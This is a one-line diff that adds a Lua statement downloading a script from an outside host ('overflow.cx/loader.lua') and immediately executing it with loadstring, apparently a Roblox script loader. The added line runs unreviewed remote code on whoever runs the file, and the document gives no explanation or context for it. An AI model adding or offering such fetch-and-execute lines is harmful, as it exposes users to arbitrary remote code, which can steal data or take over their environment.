@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://overflow.cx/loader.lua"))()
